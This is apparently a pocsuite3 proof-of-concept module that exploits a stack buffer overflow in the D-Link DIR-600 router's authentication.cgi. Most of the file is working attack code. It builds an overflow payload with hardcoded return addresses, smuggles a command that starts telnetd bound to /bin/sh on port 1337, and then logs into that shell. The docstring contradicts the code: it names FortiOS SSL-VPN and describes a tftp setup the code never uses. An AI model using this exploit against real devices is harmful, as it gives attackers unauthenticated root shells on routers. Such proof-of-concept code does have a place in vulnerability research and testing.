"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit https://pocsuite.org
"""
import itertools
import queue
import telnetlib

from pocsuite3.api import POCBase, Output, register_poc, logger, POC_CATEGORY, VUL_TYPE
from pocsuite3.lib.core.data import paths
from pocsuite3.lib.core.threads import run_threads
from itertools import cycle
# import socket
# import ssl
# from struct import pack
# from pwn import *
import requests
from pwn import *
# socket.setdefaulttimeout(5)
test=True
class DemoPOC(POCBase):
    """
    在FortiOS SSL-VPN 7.2.2通过测试，测试环境：vmware fusion 13.0.2 ，Python 3.9.10.
    使用该poc需要搭建tftp环境，拷贝1.js和busybox到tftp主目录，更换poc内硬编码ip
    测试过程中公网服务器下载文件过慢或者有vpn
    """
    vulID = ''
    version = ''
    author = ['tower']
    vulDate = '2023'
    createDate = '2023-7-13'
    updateDate = ''
    references = ['']
    name = 'dir-600缓冲区溢出'
    appPowerLink = ''
    appName = 'stakoverflow'
    appVersion = 'DIR-600_Bx_FW218WWb01'
    vulType = VUL_TYPE.LOCAL_OVERFLOW
    desc = ''''''
    samples = ['']
    category = POC_CATEGORY.TOOLS.CRACK
    protocol = POC_CATEGORY.PROTOCOL.TELNET

    def _verify(self):
        result={}
        host = self.getg_option("rhost") or b"192.168.137.54"
        path = "/remote/login".encode()
        port = self.getg_option("rport") or 80

        def poc(payload):
            headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36",
            }
            url = 'http://{}:{}/authentication.cgi'.format(host,str(port))
            params = {"id": "aaaaaaaa","password":payload}
            # print(url)
            response = requests.get(url=url, params=params, headers=headers).text
            # print(response)
            return response

        right_res=poc(b"aaaaaaaa")
        wrong_res=poc(b"a"*(1056))
        if "ERR_TIMEOUT_OR_BADUID" in right_res and "500 Internal Server Error" in wrong_res:
            result["Stdout"]="vul get!"

        return self.parse_attack(result)
    def _attack(self):
        host = self.getg_option("rhost") or b"192.168.137.54"
        port = self.getg_option("rport") or 80 
        getshell(host,port)
        result={}
        if telnet_login(host,port)==True:
            result["Stdout"]="get telneted~"
        return self.parse_attack(result)

    def parse_attack(self, result):
        output = Output(self)

        if result!={}:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

def getshell(host,port):
    def write2stack(payload,id):
        headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36",
        }
        url = 'http://{}:{}/authentication.cgi'.format(host,str(port))
        params = {"id": id,"password":payload}
        try:
            response = requests.get(url=url, params=params, headers=headers,timeout=5).text
        except:
            pass
        # print(response)
    payload=cyclic(1052,n=4)#+b'\x0a'
    payload+=p32(0x413f24) #ret1
    payload+=p32(0x22222222)
    id=b"a"*1024+payload
    password=b"/usr/sbin/telnetd${IFS}-l${IFS}/bin/sh${IFS}-p${IFS}1337;".ljust(1024,b' ')+p64(0x43a190)#s0   0x439920
    write2stack(password,id)
    telnet_login(host,11)
def telnet_login(host, port):
    ret = False
    key = [b'/ #']
    tn = None
    try:
        for _ in range(2):
            tn = telnetlib.Telnet()
            tn.open(host, 1337, timeout=6)
            tmp = tn.expect(key, timeout=6)
            # print(tmp)
            if b"BusyBox" in tmp[2]:
                ret=True
                tn.close()
                break

    except Exception:
        pass
    finally:
        if tn:
            tn.close()
    return ret

register_poc(DemoPOC)
